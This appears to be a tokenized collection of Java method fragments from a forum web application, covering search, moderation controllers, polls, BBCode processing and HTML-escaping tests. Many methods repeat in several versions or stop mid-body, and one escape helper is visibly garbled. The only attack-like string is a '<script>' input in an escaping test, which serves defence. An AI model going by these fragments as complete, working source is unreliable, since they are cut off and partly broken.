public String show ( Connection db ) throws SQLException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 | | userTopic ) { select . append ( " , topics " ) ; } if ( section ! = 0 ) { select . append ( " , groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; if ( userTopic ) { select . append ( " AND topics.userid= " ) . append ( user . getId ( ) ) ; select . append ( " AND topics.id = topic " ) ; } else { select . append ( " AND msgs.userid= " ) . append ( user . getId ( ) ) ; } } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
public ModelAndView search ( @RequestParam ( value = " q " , required = false ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , required = false ) Boolean usertopic ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q = = null ; params . put ( " initial " , initial ) ; if ( q = = null ) { q = " " ; } if ( usertopic = = null ) { usertopic = false ; } params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; ViewerCacher cacher = new ViewerCacher ( ) ; params . put ( " result " , cacher . get ( sv , false ) ) ; params . put ( " cached " , cacher . isFromCache ( ) ) ; params . put ( " time " , cacher . getTime ( ) ) ; } return new ModelAndView ( " search " , params ) ; } 
public void testCodeJava ( ) throws SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code=java]test[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" brush: java; wrap-lines: false \" >test</pre></div><p> " , result ) ; } 
public void testCodeXXX ( ) throws SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code=xxx]test[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" brush: plain; wrap-lines: false \" >test</pre></div><p> " , result ) ; } 
public void processContent ( StringBuffer buffer ) { Matcher matcher = codePattern . matcher ( buffer ) ; while ( matcher . find ( ) ) { int start = matcher . start ( ) ; 
public void testCodeExcape ( ) throws BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div><p> " , result ) ; } 
public void testCodeBR ( ) throws SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code]test ntest[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" no-highlight \" ><code>test n ntest</code></pre></div><p> " , result ) ; } 
public void testCodeJava ( ) throws SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code=java]test[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" language-java \" ><code>test</code></pre></div><p> " , result ) ; } 
public void testCodeXXX ( ) throws SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code=xxx]test[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" no-highlight \" ><code>test</code></pre></div><p> " , result ) ; } 
public void testCodeTwo ( ) throws SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code]test[/code] [code]test[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" no-highlight \" ><code>test</code></pre></div><p> <div class=code><pre class= \" no-highlight \" ><code>test</code></pre></div><p> " , result ) ; } 
public void processContent ( StringBuffer buffer ) { int end = 0 ; while ( true ) { Matcher matcher = codePattern . matcher ( buffer ) ; 
public static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ "&#91;", "&#93;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); return content; } 
public void testURLHighlight6 ( ) throws UtilException { HTMLFormatter formatter = new HTMLFormatter ( " (http:ozpp.ru/laws2/pravila-prod/tovar5.html) " ) ; formatter . enableUrlHighLightMode ( ) ; formatter . enableTexNewLineMode ( ) ; formatter . enableQuoting ( ) ; formatter . setOutputLorcode ( true ) ; assertEquals ( " ([url=http:ozpp.ru/laws2/pravila-prod/tovar5.html]http:ozpp.ru/laws2/pravila-prod/tovar5.html[/url]) " , formatter . process ( ) ) ; } 
public static int createPoll ( Connection db , String title , List < String > pollList ) throws SQLException { int voteid = getNextPollId ( db ) ; PreparedStatement pst = db . prepareStatement ( " INSERT INTO votenames (id, title) values (?,?) " ) ; pst . setInt ( 1 , voteid ) ; pst . setString ( 2 , title ) ; pst . executeUpdate ( ) ; try { Poll poll = new Poll ( db , voteid ) ; for ( String variant : pollList ) { if ( variant . trim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } } catch ( PollNotFoundException ex ) { throw new RuntimeException ( ex ) ; } return voteid ; } 
public ModelAndView showForm ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public void updateMessageText ( Connection db , User editor ) throws SQLException { PreparedStatement pstGet = db . prepareStatement ( " SELECT message FROM msgbase WHERE id=? FOR UPDATE " ) ; PreparedStatement pst = db . prepareStatement ( " UPDATE msgbase SET message=? WHERE id=? " ) ; PreparedStatement pstInfo = db . prepareStatement ( " INSERT INTO edit_info (msgid, editor, oldmessage) VALUES(?,?,?) " ) ; pstGet . setInt ( 1 , msgid ) ; ResultSet rs = pstGet . executeQuery ( ) ; if ( ! rs . next ( ) ) { throw new RuntimeException ( " Can't fetch previous message text " ) ; } pst . setString ( 1 , message ) ; pst . setInt ( 2 , msgid ) ; pst . executeUpdate ( ) ; pstInfo . setInt ( 1 , msgid ) ; pstInfo . setInt ( 2 , editor . getId ( ) ) ; pstInfo . setString ( 3 , rs . getString ( " message " ) ) ; pstInfo . executeUpdate ( ) ; } 
public List < EditInfoDTO > loadEditInfo ( Connection db ) throws SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT * FROM edit_info WHERE msgid=? ORDER BY id DESC " ) ; pst . setInt ( 1 , msgid ) ; ResultSet rs = pst . executeQuery ( ) ; List < EditInfoDTO > list = null ; while ( rs . next ( ) ) { if ( list = = null ) { list = new ArrayList < EditInfoDTO > ( ) ; } EditInfoDTO dto = new EditInfoDTO ( ) ; dto . setId ( rs . getInt ( " id " ) ) ; dto . setEditdate ( rs . getTimestamp ( " editdate " ) ) ; dto . setEditor ( rs . getInt ( " editor " ) ) ; dto . setOldmessage ( rs . getString ( " oldmessage " ) ) ; dto . setMsgid ( rs . getInt ( " msgid " ) ) ; list . add ( dto ) ; } return list ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false ) Integer sectionId ) throws Exception { Connection db = null ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView undeleteForm ( HttpServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView undelete ( HttpServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView viewVote ( @RequestParam int voteid ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showForm ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView modifyTopic ( ServletRequest request , @RequestParam int msgid , @RequestParam int postscore , @RequestParam ( required = false ) Boolean sticky , @RequestParam ( required = false ) Boolean notop ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } if ( sticky = = null ) { sticky = false ; } if ( notop = = null ) { notop = false ; } if ( postscore < - 1 ) { postscore = 0 ; } if ( postscore > 500 ) { postscore = 500 ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView viewVote ( @RequestParam ( " vote " ) int voteid ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showList ( HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public static String showComments ( Connection db , User user , int offset , int limit ) throws SQLException { DateFormat dateFormat = DateFormats . createDefault ( ) ; StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " topics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT " + limit + " OFFSET " + offset ) ; pst . setString ( 1 , user . getNick ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " topicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " title " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . toString ( ) ; } 
public ModelAndView showComments ( @RequestParam String nick , @RequestParam ( defaultValue = " 0 " ) int offset ) throws Exception { ModelAndView mv = new ModelAndView ( " show-comments " ) ; if ( offset < 0 ) { throw new ServletParameterException ( " offset<0!? " ) ; } mv . getModel ( ) . put ( " offset " , offset ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView sameIP ( HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } return new ModelAndView ( " sameip " ) ; } 
public static List < Group > getGroups ( Connection db , Section section ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, imagepost, vote, section, havelink, linktext, sections.name as sname, title, image, restrict_topics, restrict_comments, stat1,stat2,stat3,groups.id,groups.info,groups.longinfo,groups.resolvable FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) throws SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; title = rs . getString ( " title " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; longInfo = rs . getString ( " longinfo " ) ; resolvable = rs . getBoolean ( " resolvable " ) ; } 
public boolean isResolvable ( ) { return this . resolvable ; } 
public boolean isResolved ( ) { return this . resolved ; } 
public void resolveMessage ( Connection db , boolean b ) throws SQLException { PreparedStatement pstMsgbase = db . prepareStatement ( " UPDATE topics SET resolved=? WHERE id=? " ) ; pstMsgbase . setBoolean ( 1 , b ) ; pstMsgbase . setInt ( 2 , this . msgid ) ; pstMsgbase . executeUpdate ( ) ; } 
public ModelAndView modifyGroup ( @RequestParam ( " group " ) int id , @RequestParam ( " info " ) String info , @RequestParam ( " longinfo " ) String longInfo , @RequestParam ( value = " preview " , required = false ) String preview , @RequestParam ( value = " resolvable " , required = false ) String resolvable , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; try { db = dataSource . getConnection ( ) ; 
public void resolveMessage ( Connection db , boolean b ) throws SQLException { PreparedStatement pstMsgbase = db . prepareStatement ( " UPDATE topics SET resolved=?,lastmod=CURRENT_TIMESTAMP WHERE id=? " ) ; pstMsgbase . setBoolean ( 1 , b ) ; pstMsgbase . setInt ( 2 , this . msgid ) ; pstMsgbase . executeUpdate ( ) ; } 
public ModelAndView resolve ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( " msgid " ) int msgid , @RequestParam ( " resolve " ) String resolved ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public boolean isResolved ( ) { return resolved ; } 
public List < TopTenDaoImpl . TopTenMessageDTO > get ( ) { List < TopTenDaoImpl . TopTenMessageDTO > list = getTopTenDao ( ) . getMessages ( ) ; CollectionUtils . forAllDo ( list , new Closure ( ) { @Override public void execute ( Object o ) { TopTenDaoImpl . TopTenMessageDTO dto = ( TopTenDaoImpl . TopTenMessageDTO ) o ; int tmp = dto . getAnswers ( ) / itemsPerPage ; tmp = ( dto . getAnswers ( ) % itemsPerPage > 0 ) ? tmp + 1 : tmp ; dto . setPages ( tmp ) ; } } ) ; return list ; } 
public void execute ( Object o ) { TopTenDaoImpl . TopTenMessageDTO dto = ( TopTenDaoImpl . TopTenMessageDTO ) o ; int tmp = dto . getAnswers ( ) / itemsPerPage ; tmp = ( dto . getAnswers ( ) % itemsPerPage > 0 ) ? tmp + 1 : tmp ; dto . setPages ( tmp ) ; } 
public void testWolframURL ( ) throws SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [url]http:www.wolframalpha.com/input/?i=32177![/url] " ) ; assertEquals ( " <p><a href= \" http:www.wolframalpha.com/input/?i=32177! \" >http:www.wolframalpha.com/input/?i=32177!</a> " , result ) ; } 
public void substitute ( Connection db , CharSequence from , StringBuffer to , RegexTag regex , String replacement ) { to . setLength ( 0 ) ; Pattern p = regex . getRegex ( ) ; Matcher m = p . matcher ( from ) ; while ( m . find ( ) ) { if ( ! URLUtil . isUrl ( m . group ( 1 ) ) ) { m . appendReplacement ( to , BAD_DATA ) ; } else { m . appendReplacement ( to , replacement ) ; } } m . appendTail ( to ) ; } 
public ModelAndView archiveList ( @RequestParam ( " section " ) int sectionid ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView sendPassword ( @RequestParam ( " email " ) String useremail ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView doRegister ( HttpServletRequest request , @RequestParam String email ) throws Exception { HttpSession session = request . getSession ( ) ; Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { boolean changeMode = " change " . equals ( request . getParameter ( " mode " ) ) ; 
public ModelAndView doRegister ( HttpServletRequest request , @RequestParam String email , @RequestParam ( required = false ) String town , @RequestParam ( required = false ) String info , @RequestParam ( required = false ) String name , @RequestParam ( required = false ) String url , @RequestParam ( required = false ) String password , @RequestParam ( required = false ) String password2 ) throws Exception { HttpSession session = request . getSession ( ) ; Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { boolean changeMode = " change " . equals ( request . getParameter ( " mode " ) ) ; 
public static String htmlSpecialChars ( String str ) { StringBuilder res = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : Matcher m = uniRE . matcher ( str . substring ( i ) ) ; if ( m . find ( ) ) { String s = m . group ( ) ; res . append ( s ) ; i + = s . length ( ) ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . toString ( ) ; } 
public void testEscape ( ) { assertEquals ( " &lt;script&gt; " , HTMLFormatter . htmlSpecialChars ( " <script> " ) ) ; } 
public void testEscapeEntity ( ) { assertEquals ( " &nbsp; " , HTMLFormatter . htmlSpecialChars ( " &nbsp; " ) ) ; } 
public static String htmlSpecialChars ( String str ) { StringBuilder res = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : Matcher m = uniRE . matcher ( str . substring ( i ) ) ; if ( m . find ( ) ) { String s = m . group ( ) ; res . append ( s ) ; i + = s . length ( ) - 1 ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . toString ( ) ; } 
public void testEscapeEntity2 ( ) { assertEquals ( " &#41;&#41;&#41; " , HTMLFormatter . htmlSpecialChars ( " &#41;&#41;&#41; " ) ) ; } 
public ModelAndView moveTopicForm ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView moveTopic ( ServletRequest request , @RequestParam int msgid , @RequestParam ( " moveto " ) int newgr ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView moveTopicFormForum ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView serverInfo ( ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView mainPage ( ) { return new ModelAndView ( " index " ) ; } 
public ModelAndView showUserTopicsNew ( @PathVariable String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) throws Exception { return showUserTopics ( nick , offset , output , response ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick ) throws Exception { return getInfo ( nick ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public View getInfo ( @RequestParam ( " nick " ) String nick ) throws SQLException , UserNotFoundException { return new RedirectView ( " /people/ " + URLEncoder . encode ( nick ) + " /profile " ) ; } 
public ModelAndView showUserTopicsNew ( @PathVariable String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) throws Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; try { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 1000 ) ; 
public View showUserTopics ( @RequestParam ( " nick " ) String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output ) throws Exception { if ( output ! = null ) { return new RedirectView ( " /people/ " + nick + " /?output=rss " ) ; } return new RedirectView ( " /people/ " + nick + " / " ) ; } 
public ModelAndView forum ( ) throws Exception { return handleRequestInternal ( Section . SECTION_FORUM ) ; } 
public View forumOld ( ) { return new RedirectView ( " /forum " ) ; } 
public View forumOld ( ) { return new RedirectView ( " /forum/ " ) ; } 
public ModelAndView galleryArchive ( ) throws Exception { return archiveList ( Section . SECTION_GALLERY ) ; } 
public View galleryArchiveOld ( ) throws Exception { return new RedirectView ( " /gallery/archive/ " ) ; } 
public ModelAndView showNews ( @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " section " , required = false ) Integer sectionid , @RequestParam ( value = " group " , required = false ) Integer groupid , @RequestParam ( value = " tag " , required = false ) String tag , @RequestParam ( value = " offset " , required = false ) Integer offset , HttpServletResponse response ) throws Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " view-news.jsp " ) ; StringBuilder urlParams = new StringBuilder ( ) ; if ( sectionid ! = null ) { urlParams . append ( " section= " + Integer . toString ( sectionid ) ) ; } if ( tag ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( " & " ) ; } urlParams . append ( " tag= " + URLEncoder . encode ( tag ) ) ; } if ( groupid ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( " & " ) ; } urlParams . append ( " group= " + Integer . toString ( groupid ) ) ; } params . put ( " params " , urlParams ) ; try { if ( month = = null ) { 
public ModelAndView showUserTopicsNew ( @PathVariable String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) throws Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " /people/ " + nick + " / " ) ; try { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 1000 ) ; 
public View showUserTopics ( @RequestParam ( " nick " ) String nick , @RequestParam ( value = " output " , required = false ) String output ) throws Exception { if ( output ! = null ) { return new RedirectView ( " /people/ " + nick + " /?output=rss " ) ; } return new RedirectView ( " /people/ " + nick + " / " ) ; } 
public ModelAndView gallery ( @RequestParam ( required = false ) Integer offset , HttpServletResponse response ) throws Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_GALLERY , null , null , offset , response ) ; mv . getModel ( ) . put ( " url " , " /gallery/ " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public View galleryOldLink ( @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year ) { if ( offset ! = null ) { return new RedirectView ( " /gallery/?offset= " + Integer . toString ( offset ) ) ; } if ( year ! = null ) { return new RedirectView ( " /gallery/archive/ " + Integer . toString ( year ) + " / " + Integer . toString ( month ) ) ; } return new RedirectView ( " /gallery/ " ) ; } 
public ModelAndView galleryArchive ( @PathVariable int year , @PathVariable int month , HttpServletResponse response ) throws Exception { ModelAndView mv = showNews ( month , year , Section . SECTION_GALLERY , null , null , null , response ) ; mv . getModel ( ) . put ( " url " , " /gallery/archive/ " + year + " / " + month + " / " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView showUserTopicsNew ( @PathVariable String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) throws Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " /people/ " + nick + " / " ) ; TODO params.put("archiveLink", "/people/"+nick+"/archive/"); try { response.setDateHeader("Expires", System.currentTimeMillis() + 60 * 1000); 
public Group getGroup ( Connection db , String name ) throws SQLException , BadGroupException { PreparedStatement st = db . prepareStatement ( " SELECT id FROM groups WHERE section=? AND title=? " ) ; st . setInt ( 1 , id ) ; st . setString ( 2 , name ) ; ResultSet rs = st . executeQuery ( ) ; if ( ! rs . next ( ) ) { throw new BadGroupException ( " group not found " ) ; } return new Group ( db , rs . getInt ( 1 ) ) ; } 
public ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( required = false ) Integer offset , HttpServletRequest request ) throws Exception { Connection db = null ; Group group ; try { db = LorDataSource . getConnection ( ) ; Section section = new Section ( db , Section . SECTION_FORUM ) ; group = section . getGroup ( db , groupName ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } return topics ( group . getId ( ) , offset , request , false ) ; } 
public static List < Group > getGroups ( Connection db , Section section ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, imagepost, vote, section, havelink, linktext, sections.name as sname, title, urlname, image, restrict_topics, restrict_comments, stat1,stat2,stat3,groups.id,groups.info,groups.longinfo,groups.resolvable FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) throws SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; title = rs . getString ( " title " ) ; urlName = rs . getString ( " urlname " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; longInfo = rs . getString ( " longinfo " ) ; resolvable = rs . getBoolean ( " resolvable " ) ; } 
public Group getGroup ( Connection db , String name ) throws SQLException , BadGroupException { PreparedStatement st = db . prepareStatement ( " SELECT id FROM groups WHERE section=? AND urlname=? " ) ; st . setInt ( 1 , id ) ; st . setString ( 2 , name ) ; ResultSet rs = st . executeQuery ( ) ; if ( ! rs . next ( ) ) { throw new BadGroupException ( " group not found " ) ; } return new Group ( db , rs . getInt ( 1 ) ) ; } 
public ModelAndView modifyGroup ( @RequestParam ( " group " ) int id , @RequestParam ( " info " ) String info , @RequestParam ( " urlName " ) String urlName , @RequestParam ( " longinfo " ) String longInfo , @RequestParam ( value = " preview " , required = false ) String preview , @RequestParam ( value = " resolvable " , required = false ) String resolvable , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; try { db = dataSource . getConnection ( ) ; 
